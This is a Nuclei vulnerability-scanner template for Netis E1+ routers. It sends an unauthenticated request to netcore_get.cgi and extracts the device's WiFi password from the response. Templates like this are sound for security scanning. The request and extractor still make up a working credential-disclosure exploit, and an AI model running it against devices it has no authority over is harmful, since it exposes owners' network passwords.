http:
- extractors:
  - part: body
    regex:
    - '''rp_soon_password'':''([A-Za-z0-9]+)'''
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - rp_ap_password
    - rp_ap_ssid
  matchers-condition: and
  raw:
  - 'GET //netcore_get.cgi HTTP/1.1

    Host: {{Hostname}}

    Cookie: homeFirstShow=yes

    '
id: netis-info-leak
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
  description: A vulnerability in Netis allows remote unauthenticated users to disclose
    the WiFi password of the remote device.
  metadata:
    max-request: 1
  name: Netis E1+ V1.2.32533 - WiFi Password Disclosure
  reference:
  - https://www.exploit-db.com/exploits/48384
  - https://www.netis-systems.com/
  severity: high
  tags: netis,exposure,edb
